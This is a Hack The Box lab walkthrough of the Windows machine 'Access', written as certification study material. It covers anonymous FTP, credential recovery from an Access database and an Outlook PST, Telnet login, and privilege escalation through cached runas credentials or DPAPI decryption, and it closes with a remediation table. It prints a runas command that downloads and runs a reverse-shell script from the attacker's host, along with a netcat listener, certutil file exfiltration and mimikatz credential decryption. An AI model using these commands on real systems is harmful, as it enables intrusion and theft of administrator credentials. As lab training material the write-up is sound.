# Access — an Access database, an Outlook mailbox, and a runas shortcut

[![Difficulty](https://img.shields.io/badge/difficulty-Medium-yellow)](https://app.hackthebox.com/machines/access)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/access)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=Rr6Oxrj2IjU)

> **Attack path:** anonymous FTP → `backup.mdb` (mdbtools) → zip password → Outlook PST
> email → Telnet as `security` → saved Administrator credentials (`runas /savecred` or
> DPAPI) → Administrator shell.

Credentials and flags are intentionally redacted as `<password>` / `<flag>` — you should
recover them yourself while working the box.

## 1 · Reconnaissance

```bash
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.98
nmap -sV -sC -p 21,23,80 -oA nmap/scripts 10.10.10.98
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows
```

- IIS 7.5 implies Windows 7 / Server 2008 R2.
- The website on port 80 is a single image; directory brute-forcing with
  `gobuster -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt`
  finds nothing of interest.
- Unlike most Windows boxes, there is no SMB here — the entry points are FTP and Telnet.

## 2 · Foothold

### Anonymous FTP

```bash
ftp 10.10.10.98
# Name: anonymous
```

```text
ftp> ls
08-23-18  09:16PM  <DIR>  Backups
08-24-18  10:00PM  <DIR>  Engineer

ftp> cd Backups
ftp> bin
ftp> get backup.mdb          # 5652480 bytes
ftp> cd ../Engineer
ftp> get "Access Control.zip"    # 10870 bytes
```

### Parse the Access database (mdbtools)

`file backup.mdb` → `Microsoft Access Database`. Install `mdbtools` and survey it:

```bash
mdb-tables backup.mdb
```

Most tables are empty; a quick loop finds the ones with data:

```bash
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read t; do \
  lines=$(mdb-export backup.mdb "$t" | wc -l); \
  [ "$lines" -gt 1 ] && echo "$t: $lines"; done
```

The `auth_user` table holds application accounts:

```bash
mdb-export backup.mdb auth_user
```

```text
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",...
27,"engineer","<password>",...
28,"backup_admin","admin",...
```

### Unlock the zip and read the email

`unzip` cannot handle the archive (AES, "unsupported compression method 99"), but `7z x`
accepts a password — the engineer password from the database works. Inside is
`Access Control.pst`, a Microsoft Outlook email folder. Convert it with `readpst`
(`apt install readpst`):

```bash
readpst Access\ Control.pst
```

Read the resulting mbox with `less` or an email client:

```bash
mutt -Rf Access\ Control.mbox
```

The single email announces a rotated account password:

```text
Hi there,

The password for the "security" account has been changed to <password>.
Please ensure this is passed on to your engineers.

Regards,
John
```

## 3 · User flag

Telnet is open, and the mailed credentials work:

```bash
telnet 10.10.10.98
# login: security
# password: <password>
```

```text
C:\Users\security>whoami
access\security

C:\Users\security\Desktop>type user.txt
<flag>
```

## 4 · Privilege escalation

### Find the saved credentials

Two enumeration steps point the way. `cmdkey /list` shows a stored credential:

```text
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

And the Public Desktop contains `ZKAccess3.5 Security System.lnk` (binary, but `type`
reveals the strings):

```text
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
...runas.exe.../user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"...
```

The vendor shortcut launches `runas /savecred`, so Administrator credentials are cached on
this host — anyone who can run `runas` can use them without knowing the password.

### Option A — runas /savecred reverse shell

Prepare a Nishang reverse shell (`Invoke-PowerShellTcp.ps1` plus a trailing
`Invoke-PowerShellTcp -Reverse -IPAddress <tun0-ip> -Port 443` line), serve it with
`python3 -m http.server 80`, start `nc -lnvp 443`, then from the Telnet session:

```text
C:\> runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://<tun0-ip>/shell.ps1')"
```

The callback lands as `access\administrator`.

### Option B — DPAPI offline decryption

Cached credentials are DPAPI-encrypted. Exfiltrate the user master key
(`%APPDATA%\Microsoft\Protect\<SID>\<guid>`) and the credential blob
(`%APPDATA%\Microsoft\Credentials\<guid>`) via `certutil -encode <file> <out>` and
base64-decode locally. On a Windows attack box, mimikatz decrypts them:

```text
mimikatz # dpapi::masterkey /in:masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:<password>

mimikatz # dpapi::cred /in:credentials
...
  UserName       : ACCESS\Administrator
  CredentialBlob : <password>
```

That plaintext also authenticates the Administrator Telnet account directly.

## 5 · Root flag / Domain Admin

```text
C:\Users\Administrator\Desktop> type root.txt
<flag>
```

Shell method A gives an interactive Administrator PowerShell; method B works over plain
`telnet 10.10.10.98` as `administrator`.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| Anonymous FTP exposing database backups and staff archives | Unauthenticated users recover internal credentials in minutes | Disable anonymous FTP; never store backups or mail archives on the FTP root |
| Plaintext credentials stored in the Access database and mailed between staff | Any reader of the backup or PST owns the `security` account | Hash passwords at rest; stop emailing credentials |
| Telnet (plaintext, interactive logons) exposed to the network | Credential capture and trivial remote access | Disable the Telnet service; use SSH/WinRM |
| Administrator credentials cached with `runas /savecred` on a shared desktop | Any local user executes code as Administrator without the password | Remove /savecred usage and the vendor shortcut; purge stored creds (`cmdkey /delete`) |
| DPAPI credential blobs readable by the logged-on user | Offline recovery of the Administrator password | Restrict interactive logons; rotate credentials once exposure is suspected |

## 7 · CPTS takeaways

- Uncommon file formats (`.mdb`, `.pst`) are routine in CPTS: know the `mdbtools` suite
  (`mdb-tables`, `mdb-export`) and `readpst` for Outlook archives — plus `mutt` for
  browsing converted mail.
- Credentials migrate through an org (database → zip → email → account); follow the data,
  not just the exploits.
- `cmdkey /list` plus any `runas /savecred` shortcut is a canonical Windows privesc —
  also flagged automatically by winPEAS.
- The same cached credential yields two attack paths (runas abuse vs DPAPI masterkey
  decryption with mimikatz) — CPTS rewards knowing both the quick and the forensics path.
- Legacy services (Telnet, FTP) on modern engagements are finding-report material:
  cleartext protocols alone justify remediation recommendations.
